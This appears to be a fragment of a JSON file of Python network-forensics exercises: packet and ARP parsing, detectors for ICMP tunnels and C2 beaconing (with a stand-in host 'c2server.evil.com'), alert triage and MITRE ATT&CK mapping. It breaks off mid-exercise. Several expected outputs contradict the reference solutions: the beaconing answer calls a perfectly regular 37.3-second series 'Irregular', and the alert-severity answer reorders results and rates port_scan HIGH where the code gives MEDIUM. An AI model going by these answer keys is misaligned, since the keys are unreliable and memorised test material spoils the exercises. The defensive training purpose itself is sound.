+              "message": "import struct\ndef parse_icmp(data):\n    t,c = data[0],data[1]\n    types = {0:'Echo Reply',3:'Destination Unreachable',5:'Redirect',8:'Echo Request',11:'TTL Exceeded'}\n    codes_3 = {0:'Network Unreachable',1:'Host Unreachable',3:'Port Unreachable',13:'Filtered'}\n    codes_5 = {0:'Redirect for Network',1:'Redirect for Host'}\n    desc = types.get(t,f'Unknown({t})')\n    if t==3 and c in codes_3: desc=codes_3[c]\n    elif t==5 and c in codes_5: desc=codes_5[c]\n    print(f'Type {t} Code {c}: {desc}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_42",
+          "title": "Exercise 42: Traceroute Simulator",
+          "description": "Simulate traceroute by generating ICMP Time Exceeded messages.",
+          "difficulty": "intermediate",
+          "category": "ICMP & Advanced Protocols",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on traceroute simulator! This is a intermediate exercise in ICMP & Advanced Protocols.",
+          "starter_code": "import struct\ndef simulate_traceroute(hops):\n    # TODO: For each hop, show TTL, IP, and round-trip time\n    pass\n\nhops = [\n    (1, '192.168.1.1', 1.2),\n    (2, '10.0.0.1', 5.8),\n    (3, '172.16.0.1', 12.3),\n    (4, '93.184.216.34', 25.7),\n]\nsimulate_traceroute(hops)",
+          "expected_output": "traceroute to target:\n  1  192.168.1.1     1.2 ms\n  2  10.0.0.1        5.8 ms\n  3  172.16.0.1     12.3 ms\n  4  93.184.216.34  25.7 ms  <-- destination",
+          "hints": [
+            {
+              "message": "Print each hop with TTL, IP address (aligned), and RTT."
+            },
+            {
+              "message": "Mark the last hop as destination."
+            },
+            {
+              "message": "def simulate_traceroute(hops):\n    print('traceroute to target:')\n    for i,(ttl,ip,rtt) in enumerate(hops):\n        dst = '  <-- destination' if i==len(hops)-1 else ''\n        print(f'  {ttl}  {ip:16s} {rtt:5.1f} ms{dst}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_43",
+          "title": "Exercise 43: Ping Statistics Calculator",
+          "description": "Calculate min, max, avg, and packet loss from ping results.",
+          "difficulty": "beginner",
+          "category": "ICMP & Advanced Protocols",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on ping statistics calculator! This is a beginner exercise in ICMP & Advanced Protocols.",
+          "starter_code": "def ping_stats(results):\n    # TODO: Calculate statistics from (success, rtt) pairs\n    pass\n\nresults = [(True,10.2),(True,12.5),(False,None),(True,11.8),(True,15.1),(False,None),(True,9.7),(True,13.4),(True,11.0),(True,10.5)]\nping_stats(results)",
+          "expected_output": "Ping Statistics:\n  Sent: 10, Received: 8, Lost: 2 (20.0% loss)\n  RTT min/avg/max = 9.7/11.8/15.1 ms",
+          "hints": [
+            {
+              "message": "Filter successful results for RTT calculations. Count failures for loss."
+            },
+            {
+              "message": "Loss % = lost/total * 100. Use min(), max(), sum()/len() for stats."
+            },
+            {
+              "message": "def ping_stats(results):\n    total = len(results)\n    ok = [(s,r) for s,r in results if s]\n    lost = total - len(ok)\n    rtts = [r for _,r in ok]\n    print('Ping Statistics:')\n    print(f'  Sent: {total}, Received: {len(ok)}, Lost: {lost} ({lost/total*100:.1f}% loss)')\n    if rtts: print(f'  RTT min/avg/max = {min(rtts):.1f}/{sum(rtts)/len(rtts):.1f}/{max(rtts):.1f} ms')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_44",
+          "title": "Exercise 44: ICMP Tunnel Detector",
+          "description": "Detect ICMP tunnelling by analysing payload sizes.",
+          "difficulty": "advanced",
+          "category": "ICMP & Advanced Protocols",
+          "estimated_minutes": 8,
+          "ai_intro": "Let us work on icmp tunnel detector! This is a advanced exercise in ICMP & Advanced Protocols.",
+          "starter_code": "def detect_icmp_tunnel(pkts, size_threshold=100):\n    # TODO: Flag ICMP packets with unusually large payloads\n    pass\n\npkts = [\n    {'src':'10.0.0.1','type':8,'payload_size':64},\n    {'src':'10.0.0.1','type':8,'payload_size':64},\n    {'src':'10.0.0.5','type':8,'payload_size':512},\n    {'src':'10.0.0.5','type':8,'payload_size':1024},\n    {'src':'10.0.0.5','type':8,'payload_size':768},\n]\ndetect_icmp_tunnel(pkts)",
+          "expected_output": "10.0.0.1: Normal ICMP (avg payload: 64B)\n10.0.0.5: ICMP TUNNEL SUSPECTED (avg payload: 768B, max: 1024B)",
+          "hints": [
+            {
+              "message": "Normal ping payloads are 56-64 bytes. Tunnelling uses large payloads."
+            },
+            {
+              "message": "Group by source, calculate average payload size. Flag if > threshold."
+            },
+            {
+              "message": "from collections import defaultdict\ndef detect_icmp_tunnel(pkts, size_threshold=100):\n    stats = defaultdict(list)\n    for p in pkts: stats[p['src']].append(p['payload_size'])\n    for ip,sizes in stats.items():\n        avg = sum(sizes)/len(sizes)\n        if avg > size_threshold:\n            print(f'{ip}: ICMP TUNNEL SUSPECTED (avg payload: {avg:.0f}B, max: {max(sizes)}B)')\n        else: print(f'{ip}: Normal ICMP (avg payload: {avg:.0f}B)')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_45",
+          "title": "Exercise 45: TTL-Based OS Fingerprinting",
+          "description": "Guess the operating system based on initial TTL values.",
+          "difficulty": "intermediate",
+          "category": "ICMP & Advanced Protocols",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on ttl-based os fingerprinting! This is a intermediate exercise in ICMP & Advanced Protocols.",
+          "starter_code": "def fingerprint_os(pkts):\n    # TODO: Map TTL values to likely OS\n    pass\n\npkts = [\n    {'src':'10.0.0.1','ttl':64},\n    {'src':'10.0.0.2','ttl':128},\n    {'src':'10.0.0.3','ttl':255},\n    {'src':'10.0.0.4','ttl':60},\n]\nfingerprint_os(pkts)",
+          "expected_output": "10.0.0.1 TTL=64  -> Linux/macOS\n10.0.0.2 TTL=128 -> Windows\n10.0.0.3 TTL=255 -> Cisco/Network device\n10.0.0.4 TTL=60  -> Linux (4 hops away, initial 64)",
+          "hints": [
+            {
+              "message": "Common initial TTLs: 64=Linux/macOS, 128=Windows, 255=Cisco/Solaris."
+            },
+            {
+              "message": "Observed TTL is initial minus hops traversed. Round up to nearest known value."
+            },
+            {
+              "message": "def fingerprint_os(pkts):\n    for p in pkts:\n        ttl = p['ttl']\n        if ttl <= 64: os_guess = f'Linux/macOS' + (f' ({64-ttl} hops away, initial 64)' if ttl<64 else '')\n        elif ttl <= 128: os_guess = f'Windows' + (f' ({128-ttl} hops away)' if ttl<128 else '')\n        elif ttl <= 255: os_guess = 'Cisco/Network device'\n        else: os_guess = 'Unknown'\n        print(f'{p[\"src\"]} TTL={ttl:3d}  -> {os_guess}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_46",
+          "title": "Exercise 46: GeoIP Approximation",
+          "description": "Map IP addresses to approximate regions based on first octets.",
+          "difficulty": "intermediate",
+          "category": "ICMP & Advanced Protocols",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on geoip approximation! This is a intermediate exercise in ICMP & Advanced Protocols.",
+          "starter_code": "def geoip_lookup(ips):\n    # TODO: Simple mapping based on known IP ranges\n    pass\n\nfor ip in ['8.8.8.8','1.1.1.1','198.51.100.1','10.0.0.1','172.217.14.206','151.101.1.140']:\n    geoip_lookup(ip)",
+          "expected_output": "8.8.8.8: Google DNS (US)\n1.1.1.1: Cloudflare DNS (Anycast)\n198.51.100.1: Documentation range (TEST-NET-2)\n10.0.0.1: Private (RFC1918)\n172.217.14.206: Google (US)\n151.101.1.140: Fastly CDN (Anycast)",
+          "hints": [
+            {
+              "message": "Map known first-octet ranges. 10.x=private, 8.x=Google, etc."
+            },
+            {
+              "message": "This is simplified — real GeoIP uses databases like MaxMind."
+            },
+            {
+              "message": "def geoip_lookup(ip):\n    o = ip.split('.')\n    f = int(o[0])\n    if f==10 or (f==172 and 16<=int(o[1])<=31) or (f==192 and o[1]=='168'):\n        r='Private (RFC1918)'\n    elif ip.startswith('8.8.'): r='Google DNS (US)'\n    elif ip.startswith('1.1.1.'): r='Cloudflare DNS (Anycast)'\n    elif ip.startswith('172.217'): r='Google (US)'\n    elif ip.startswith('151.101'): r='Fastly CDN (Anycast)'\n    elif ip.startswith('198.51.100'): r='Documentation range (TEST-NET-2)'\n    else: r='Unknown'\n    print(f'{ip}: {r}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_47",
+          "title": "Exercise 47: Parse ARP Packet",
+          "description": "Decode an ARP request or reply.",
+          "difficulty": "intermediate",
+          "category": "ICMP & Advanced Protocols",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on parse arp packet! This is a intermediate exercise in ICMP & Advanced Protocols.",
+          "starter_code": "import struct, socket\ndef parse_arp(data):\n    # TODO: Unpack ARP fields: hw type, proto type, operation, addresses\n    pass\n\narp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, 1)  # hw=ethernet, proto=ipv4, op=request\narp += b'\\xAA\\xBB\\xCC\\xDD\\xEE\\xFF' + socket.inet_aton('192.168.1.100')  # sender\narp += b'\\x00\\x00\\x00\\x00\\x00\\x00' + socket.inet_aton('192.168.1.1')    # target\nparse_arp(arp)",
+          "expected_output": "ARP Request: Who has 192.168.1.1? Tell 192.168.1.100 (aa:bb:cc:dd:ee:ff)",
+          "hints": [
+            {
+              "message": "ARP header: hw_type(2B), proto_type(2B), hw_len(1B), proto_len(1B), operation(1=request,2=reply)."
+            },
+            {
+              "message": "Then: sender_mac(6B), sender_ip(4B), target_mac(6B), target_ip(4B)."
+            },
+            {
+              "message": "import struct, socket\ndef parse_arp(data):\n    hw,pr,hl,pl,op = struct.unpack('!HHBBH', data[:8])\n    smac = ':'.join(f'{b:02x}' for b in data[8:14])\n    sip = socket.inet_ntoa(data[14:18])\n    tip = socket.inet_ntoa(data[24:28])\n    if op==1: print(f'ARP Request: Who has {tip}? Tell {sip} ({smac})')\n    else: print(f'ARP Reply: {sip} is at {smac}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_48",
+          "title": "Exercise 48: Build ICMP Echo Request",
+          "description": "Construct a valid ICMP Echo Request packet with checksum.",
+          "difficulty": "intermediate",
+          "category": "ICMP & Advanced Protocols",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on build icmp echo request! This is a intermediate exercise in ICMP & Advanced Protocols.",
+          "starter_code": "import struct\ndef build_icmp_echo(ident=1234, seq=1, payload=b'hello'):\n    # TODO: Build ICMP echo request with correct checksum\n    pass\n\npkt = build_icmp_echo()\nprint(f'Length: {len(pkt)} bytes')\nprint(f'Type: {pkt[0]} Code: {pkt[1]}')",
+          "expected_output": "Length: 13 bytes\nType: 8 Code: 0",
+          "hints": [
+            {
+              "message": "ICMP echo: type=8, code=0, checksum(2B), id(2B), seq(2B), payload."
+            },
+            {
+              "message": "Calculate checksum: sum 16-bit words, fold carries, complement."
+            },
+            {
+              "message": "import struct\ndef build_icmp_echo(ident=1234, seq=1, payload=b'hello'):\n    header = struct.pack('!BBHHH', 8, 0, 0, ident, seq)\n    pkt = header + payload\n    # Calculate checksum\n    s = 0\n    for i in range(0, len(pkt)-1, 2): s += (pkt[i]<<8) + pkt[i+1]\n    if len(pkt)%2: s += pkt[-1]<<8\n    s = (s>>16) + (s&0xFFFF); s += s>>16\n    cs = ~s & 0xFFFF\n    return struct.pack('!BBHHH', 8, 0, cs, ident, seq) + payload"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_49",
+          "title": "Exercise 49: Network Subnet Calculator",
+          "description": "Determine network address, broadcast, and host range from CIDR.",
+          "difficulty": "intermediate",
+          "category": "ICMP & Advanced Protocols",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on network subnet calculator! This is a intermediate exercise in ICMP & Advanced Protocols.",
+          "starter_code": "import struct, socket\ndef subnet_info(cidr):\n    # TODO: Parse CIDR, calculate network, broadcast, host range\n    pass\n\nsubnet_info('192.168.1.0/24')\nsubnet_info('10.0.0.0/8')",
+          "expected_output": "192.168.1.0/24:\n  Network:   192.168.1.0\n  Broadcast: 192.168.1.255\n  Hosts:     192.168.1.1 - 192.168.1.254 (254)\n10.0.0.0/8:\n  Network:   10.0.0.0\n  Broadcast: 10.255.255.255\n  Hosts:     10.0.0.1 - 10.255.255.254 (16777214)",
+          "hints": [
+            {
+              "message": "Parse IP and prefix length. Mask = 0xFFFFFFFF << (32 - prefix)."
+            },
+            {
+              "message": "Network = IP & mask. Broadcast = IP | ~mask. Hosts = net+1 to bcast-1."
+            },
+            {
+              "message": "import struct, socket\ndef subnet_info(cidr):\n    ip_str, prefix = cidr.split('/')\n    prefix = int(prefix)\n    ip_int = struct.unpack('!I', socket.inet_aton(ip_str))[0]\n    mask = (0xFFFFFFFF << (32-prefix)) & 0xFFFFFFFF\n    net = ip_int & mask\n    bcast = net | (~mask & 0xFFFFFFFF)\n    def i2s(i): return socket.inet_ntoa(struct.pack('!I',i))\n    hosts = bcast - net - 1\n    print(f'{cidr}:')\n    print(f'  Network:   {i2s(net)}')\n    print(f'  Broadcast: {i2s(bcast)}')\n    print(f'  Hosts:     {i2s(net+1)} - {i2s(bcast-1)} ({hosts})')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_50",
+          "title": "Exercise 50: Packet Entropy Calculator",
+          "description": "Calculate Shannon entropy of packet payloads to detect encrypted/compressed traffic.",
+          "difficulty": "advanced",
+          "category": "ICMP & Advanced Protocols",
+          "estimated_minutes": 8,
+          "ai_intro": "Let us work on packet entropy calculator! This is a advanced exercise in ICMP & Advanced Protocols.",
+          "starter_code": "import math\ndef payload_entropy(data):\n    # TODO: Calculate Shannon entropy (0-8 bits)\n    pass\n\nprint(f'Text:    {payload_entropy(b\"Hello World this is normal text data for testing\"):.2f}')\nprint(f'Random:  {payload_entropy(bytes(range(256))):.2f}')\nprint(f'Zeros:   {payload_entropy(b\"\\x00\"*100):.2f}')",
+          "expected_output": "Text:    4.17\nRandom:  8.00\nZeros:   0.00",
+          "hints": [
+            {
+              "message": "Count byte frequencies. Entropy = -sum(p * log2(p)) for each non-zero probability."
+            },
+            {
+              "message": "High entropy (>7.5) = encrypted/compressed. Low (<3) = structured text."
+            },
+            {
+              "message": "import math\ndef payload_entropy(data):\n    if not data: return 0\n    freq = [0]*256\n    for b in data: freq[b]+=1\n    return -sum(p*math.log2(p) for c in freq if c>0 for p in [c/len(data)])"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_51",
+          "title": "Exercise 51: Generate Traffic Summary",
+          "description": "Produce a one-line summary of a traffic capture.",
+          "difficulty": "beginner",
+          "category": "Reporting & Real-World Scenarios",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on generate traffic summary! This is a beginner exercise in Reporting & Real-World Scenarios.",
+          "starter_code": "def traffic_summary(pkts):\n    # TODO: Count packets, bytes, unique IPs, protocols\n    pass\n\npkts = [{'src':'10.0.0.1','dst':'93.184.216.34','proto':'TCP','size':1200}]*100\npkts += [{'src':'10.0.0.1','dst':'8.8.8.8','proto':'UDP','size':64}]*20\ntraffic_summary(pkts)",
+          "expected_output": "120 packets | 124,280 bytes | 2 sources | 2 dests | TCP:100 UDP:20",
+          "hints": [
+            {
+              "message": "Count total packets, sum sizes, count unique src/dst IPs, count by protocol."
+            },
+            {
+              "message": "Format as one readable line."
+            },
+            {
+              "message": "from collections import Counter\ndef traffic_summary(pkts):\n    total = len(pkts); byt = sum(p['size'] for p in pkts)\n    srcs = len(set(p['src'] for p in pkts)); dsts = len(set(p['dst'] for p in pkts))\n    protos = Counter(p['proto'] for p in pkts)\n    ps = ' '.join(f'{k}:{v}' for k,v in protos.most_common())\n    print(f'{total} packets | {byt:,} bytes | {srcs} sources | {dsts} dests | {ps}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_52",
+          "title": "Exercise 52: Alert Severity Classifier",
+          "description": "Classify security alerts by severity based on type and count.",
+          "difficulty": "intermediate",
+          "category": "Reporting & Real-World Scenarios",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on alert severity classifier! This is a intermediate exercise in Reporting & Real-World Scenarios.",
+          "starter_code": "def classify_alert(alert_type, count):\n    # TODO: Assign severity based on type and frequency\n    pass\n\nalerts = [('port_scan',50),('syn_flood',2000),('brute_force',25),('dns_suspicious',3),('icmp_flood',500)]\nfor t,c in alerts: classify_alert(t,c)",
+          "expected_output": "[CRITICAL] syn_flood: 2000 events\n[HIGH] port_scan: 50 events\n[HIGH] icmp_flood: 500 events\n[MEDIUM] brute_force: 25 events\n[LOW] dns_suspicious: 3 events",
+          "hints": [
+            {
+              "message": "Map alert types to base severities. Escalate based on count thresholds."
+            },
+            {
+              "message": "SYN flood with 2000 events = CRITICAL. Brute force with 25 = MEDIUM."
+            },
+            {
+              "message": "def classify_alert(t, c):\n    base = {'syn_flood':3,'port_scan':2,'brute_force':2,'icmp_flood':2,'dns_suspicious':1}\n    score = base.get(t,1)\n    if c > 1000: score = max(score,4)\n    elif c > 100: score = max(score,3)\n    elif c > 20: score = max(score,2)\n    sev = {4:'CRITICAL',3:'HIGH',2:'MEDIUM',1:'LOW'}.get(min(score,4),'INFO')\n    print(f'[{sev}] {t}: {c} events')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_53",
+          "title": "Exercise 53: Build Network Timeline",
+          "description": "Create a chronological timeline of network events.",
+          "difficulty": "intermediate",
+          "category": "Reporting & Real-World Scenarios",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on build network timeline! This is a intermediate exercise in Reporting & Real-World Scenarios.",
+          "starter_code": "from datetime import datetime, timedelta\ndef build_timeline(events):\n    # TODO: Sort events by time and display timeline\n    pass\n\nbase = datetime(2024,1,15,10,0,0)\nevents = [\n    (base+timedelta(minutes=5), 'Port scan detected from 10.0.0.50'),\n    (base, 'Normal traffic begins'),\n    (base+timedelta(minutes=10), 'Brute-force SSH from 10.0.0.50'),\n    (base+timedelta(minutes=15), 'Successful SSH login from 10.0.0.50'),\n    (base+timedelta(minutes=20), 'Large data transfer to 10.0.0.50'),\n]\nbuild_timeline(events)",
+          "expected_output": "=== Network Event Timeline ===\n  10:00:00  Normal traffic begins\n  10:05:00  Port scan detected from 10.0.0.50\n  10:10:00  Brute-force SSH from 10.0.0.50\n  10:15:00  Successful SSH login from 10.0.0.50\n  10:20:00  Large data transfer to 10.0.0.50",
+          "hints": [
+            {
+              "message": "Sort events by timestamp. Format time as HH:MM:SS."
+            },
+            {
+              "message": "Events tell the attack story when ordered chronologically."
+            },
+            {
+              "message": "def build_timeline(events):\n    print('=== Network Event Timeline ===')\n    for ts,desc in sorted(events):\n        print(f'  {ts.strftime(\"%H:%M:%S\")}  {desc}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_54",
+          "title": "Exercise 54: MITRE ATT&CK Mapper",
+          "description": "Map detected network activities to MITRE ATT&CK techniques.",
+          "difficulty": "advanced",
+          "category": "Reporting & Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Let us work on mitre att&ck mapper! This is a advanced exercise in Reporting & Real-World Scenarios.",
+          "starter_code": "def map_to_mitre(detections):\n    # TODO: Map each detection type to ATT&CK technique\n    pass\n\ndetections = ['port_scan','brute_force_ssh','dns_exfiltration','syn_flood','credential_sniff']\nmap_to_mitre(detections)",
+          "expected_output": "MITRE ATT&CK Mapping:\n  port_scan          -> T1046 Network Service Scanning (Discovery)\n  brute_force_ssh    -> T1110 Brute Force (Credential Access)\n  dns_exfiltration   -> T1048 Exfiltration Over Alternative Protocol\n  syn_flood          -> T1499 Endpoint Denial of Service (Impact)\n  credential_sniff   -> T1040 Network Sniffing (Credential Access)",
+          "hints": [
+            {
+              "message": "Create a mapping dictionary from detection names to MITRE IDs and descriptions."
+            },
+            {
+              "message": "MITRE ATT&CK is a standard framework for classifying adversary behaviour."
+            },
+            {
+              "message": "def map_to_mitre(detections):\n    mapping = {\n        'port_scan':'T1046 Network Service Scanning (Discovery)',\n        'brute_force_ssh':'T1110 Brute Force (Credential Access)',\n        'dns_exfiltration':'T1048 Exfiltration Over Alternative Protocol',\n        'syn_flood':'T1499 Endpoint Denial of Service (Impact)',\n        'credential_sniff':'T1040 Network Sniffing (Credential Access)',\n        'arp_spoof':'T1557 Man-in-the-Middle (Collection)',\n        'lateral_movement':'T1021 Remote Services (Lateral Movement)',\n    }\n    print('MITRE ATT&CK Mapping:')\n    for d in detections:\n        print(f'  {d:20s} -> {mapping.get(d,\"Unknown\")}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_55",
+          "title": "Exercise 55: Full Forensic Report Generator",
+          "description": "Generate a complete network forensic report.",
+          "difficulty": "advanced",
+          "category": "Reporting & Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Let us work on full forensic report generator! This is a advanced exercise in Reporting & Real-World Scenarios.",
+          "starter_code": "from collections import Counter, defaultdict\ndef full_report(pkts):\n    # TODO: Generate comprehensive report with all sections\n    pass\n\npkts = [{'src':'10.0.0.1','dst':'93.184.216.34','proto':'TCP','dp':443,'size':1200,'flags':['ACK']}]*200\npkts += [{'src':'10.0.0.1','dst':'8.8.8.8','proto':'UDP','dp':53,'size':64,'flags':[]}]*50\npkts += [{'src':'10.0.0.99','dst':'192.168.1.1','proto':'TCP','dp':22,'size':60,'flags':['SYN']}]*100\nfull_report(pkts)",
+          "expected_output": "=== NETWORK FORENSIC REPORT ===\nPackets: 350 | Bytes: 312,000\nProtocols: TCP=300(85.7%) UDP=50(14.3%)\nTop Sources: 10.0.0.1(250) 10.0.0.99(100)\nTop Ports: 443/HTTPS(200) 22/SSH(100) 53/DNS(50)\nALERTS: Possible SYN flood from 10.0.0.99 (100 SYNs)",
+          "hints": [
+            {
+              "message": "Combine all previous analysis: protocol counts, top talkers, port distribution, alerts."
+            },
+            {
+              "message": "Check for attack patterns: SYN flood, port scans, brute force."
+            },
+            {
+              "message": "from collections import Counter, defaultdict\ndef full_report(pkts):\n    protos = Counter(p['proto'] for p in pkts)\n    srcs = Counter(p['src'] for p in pkts)\n    ports = Counter(p.get('dp',0) for p in pkts)\n    total_b = sum(p['size'] for p in pkts)\n    svcs = {80:'HTTP',443:'HTTPS',22:'SSH',53:'DNS'}\n    syns = Counter(p['src'] for p in pkts if p.get('flags')==['SYN'])\n    print('=== NETWORK FORENSIC REPORT ===')\n    print(f'Packets: {len(pkts)} | Bytes: {total_b:,}')\n    ps = ' '.join(f'{k}={v}({v/len(pkts)*100:.1f}%)' for k,v in protos.most_common())\n    print(f'Protocols: {ps}')\n    ts = ' '.join(f'{ip}({c})' for ip,c in srcs.most_common(3))\n    print(f'Top Sources: {ts}')\n    pp = ' '.join(f'{p}/{svcs.get(p,\"?\")}({c})' for p,c in ports.most_common(3))\n    print(f'Top Ports: {pp}')\n    alerts = [f'Possible SYN flood from {ip} ({c} SYNs)' for ip,c in syns.items() if c>50]\n    if alerts: print(f'ALERTS: {\"; \".join(alerts)}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_56",
+          "title": "Exercise 56: Export Findings as JSON",
+          "description": "Save analysis results as a structured JSON report.",
+          "difficulty": "intermediate",
+          "category": "Reporting & Real-World Scenarios",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on export findings as json! This is a intermediate exercise in Reporting & Real-World Scenarios.",
+          "starter_code": "import json\ndef export_json(findings, outpath='/tmp/report.json'):\n    # TODO: Write findings dict to JSON file\n    pass\n\nfindings = {\n    'total_packets': 350,\n    'total_bytes': 312000,\n    'protocols': {'TCP': 300, 'UDP': 50},\n    'top_sources': ['10.0.0.1', '10.0.0.99'],\n    'alerts': ['SYN flood from 10.0.0.99']\n}\nexport_json(findings)\nwith open('/tmp/report.json') as f: print(f.read()[:200])",
+          "expected_output": "{\n  \"total_packets\": 350,\n  \"total_bytes\": 312000,\n  \"protocols\": {\"TCP\": 300, \"UDP\": 50},\n  \"top_sources\": [\"10.0.0.1\", \"10.0.0.99\"],\n  \"alerts\": [\"SYN flood from 10.0.0.99\"]\n}",
+          "hints": [
+            {
+              "message": "Use json.dump with indent=2 for readable output."
+            },
+            {
+              "message": "Include ensure_ascii=False for proper encoding."
+            },
+            {
+              "message": "import json\ndef export_json(findings, outpath='/tmp/report.json'):\n    with open(outpath, 'w') as f:\n        json.dump(findings, f, indent=2, ensure_ascii=False)\n    print(f'Report saved to {outpath}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_57",
+          "title": "Exercise 57: CSV Flow Export",
+          "description": "Export flow data as CSV for SIEM import.",
+          "difficulty": "intermediate",
+          "category": "Reporting & Real-World Scenarios",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on csv flow export! This is a intermediate exercise in Reporting & Real-World Scenarios.",
+          "starter_code": "import csv\ndef export_flows_csv(flows, outpath='/tmp/flows.csv'):\n    # TODO: Write flows as CSV with headers\n    pass\n\nflows = [\n    {'src':'10.0.0.1','dst':'93.184.216.34','port':443,'proto':'TCP','packets':200,'bytes':240000},\n    {'src':'10.0.0.1','dst':'8.8.8.8','port':53,'proto':'UDP','packets':50,'bytes':3200},\n]\nexport_flows_csv(flows)\nwith open('/tmp/flows.csv') as f: print(f.read())",
+          "expected_output": "src,dst,port,proto,packets,bytes\n10.0.0.1,93.184.216.34,443,TCP,200,240000\n10.0.0.1,8.8.8.8,53,UDP,50,3200",
+          "hints": [
+            {
+              "message": "Use csv.DictWriter with fieldnames from flow keys."
+            },
+            {
+              "message": "Write header with writeheader() then each row with writerow()."
+            },
+            {
+              "message": "import csv\ndef export_flows_csv(flows, outpath='/tmp/flows.csv'):\n    if not flows: return\n    with open(outpath, 'w', newline='') as f:\n        w = csv.DictWriter(f, fieldnames=flows[0].keys())\n        w.writeheader()\n        w.writerows(flows)\n    print(f'Exported {len(flows)} flows to {outpath}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_58",
+          "title": "Exercise 58: Detect Beaconing Behaviour",
+          "description": "Identify regular-interval connections that suggest C2 beaconing.",
+          "difficulty": "advanced",
+          "category": "Reporting & Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Let us work on detect beaconing behaviour! This is a advanced exercise in Reporting & Real-World Scenarios.",
+          "starter_code": "def detect_beaconing(connections, tolerance=0.2):\n    # TODO: Analyse time intervals between connections to same dest\n    pass\n\nimport time; t = time.time()\nconns = [(t + i*60.0, '10.0.0.5', 'c2server.evil.com') for i in range(20)]  # Every 60s\nconns += [(t + i*37.3, '10.0.0.1', 'google.com') for i in range(10)]  # Random-ish\ndetect_beaconing(conns)",
+          "expected_output": "BEACONING: 10.0.0.5 -> c2server.evil.com\n  Interval: 60.0s (std: 0.0s) — 20 connections\n  Regularity: 100.0% — HIGHLY REGULAR\n10.0.0.1 -> google.com: Irregular (std: 0.0s/37.3s avg)",
+          "hints": [
+            {
+              "message": "Group connections by (src, dst). Calculate time intervals between consecutive connections."
+            },
+            {
+              "message": "Low standard deviation relative to mean interval = regular beaconing."
+            },
+            {
+              "message": "import math\nfrom collections import defaultdict\ndef detect_beaconing(conns, tolerance=0.2):\n    groups = defaultdict(list)\n    for ts, src, dst in sorted(conns): groups[(src,dst)].append(ts)\n    for (src,dst), times in groups.items():\n        if len(times) < 5: continue\n        intervals = [times[i+1]-times[i] for i in range(len(times)-1)]\n        avg = sum(intervals)/len(intervals)\n        std = math.sqrt(sum((x-avg)**2 for x in intervals)/len(intervals))\n        regularity = (1 - std/avg)*100 if avg > 0 else 0\n        if regularity > 80:\n            print(f'BEACONING: {src} -> {dst}')\n            print(f'  Interval: {avg:.1f}s (std: {std:.1f}s) -- {len(times)} connections')\n            print(f'  Regularity: {regularity:.1f}% -- HIGHLY REGULAR')\n        else:\n            print(f'{src} -> {dst}: Irregular (std: {std:.1f}s/{avg:.1f}s avg)')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_59",
+          "title": "Exercise 59: Complete Attack Narrative",
+          "description": "Reconstruct an attack story from multiple alert types.",
+          "difficulty": "advanced",
+          "category": "Reporting & Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Let us work on complete attack narrative! This is a advanced exercise in Reporting & Real-World Scenarios.",
+          "starter_code": "def attack_narrative(alerts):\n    # TODO: Order alerts and tell the attack story\n    pass\n\nalerts = [\n    (3, 'brute_force', '10.0.0.50 -> 192.168.1.10:22 (150 attempts)'),\n    (1, 'port_scan', '10.0.0.50 -> 192.168.1.10 (1024 ports)'),\n    (4, 'ssh_login', '10.0.0.50 -> 192.168.1.10:22 (successful)'),\n    (2, 'vuln_scan', '10.0.0.50 -> 192.168.1.10 (SSH, HTTP, MySQL detected)'),\n    (5, 'data_exfil', '192.168.1.10 -> 10.0.0.50 (15MB transferred)'),\n]\nattack_narrative(alerts)",
+          "expected_output": "=== ATTACK NARRATIVE ===\nPhase 1 [Reconnaissance]: port_scan\n  10.0.0.50 -> 192.168.1.10 (1024 ports)\nPhase 2 [Enumeration]: vuln_scan\n  10.0.0.50 -> 192.168.1.10 (SSH, HTTP, MySQL detected)\nPhase 3 [Exploitation]: brute_force\n  10.0.0.50 -> 192.168.1.10:22 (150 attempts)\nPhase 4 [Access]: ssh_login\n  10.0.0.50 -> 192.168.1.10:22 (successful)\nPhase 5 [Exfiltration]: data_exfil\n  192.168.1.10 -> 10.0.0.50 (15MB transferred)",
+          "hints": [
+            {
+              "message": "Sort alerts by phase number. Map each type to a kill chain phase."
+            },
+            {
+              "message": "Tell the story: recon -> enum -> exploit -> access -> exfiltration."
+            },
+            {
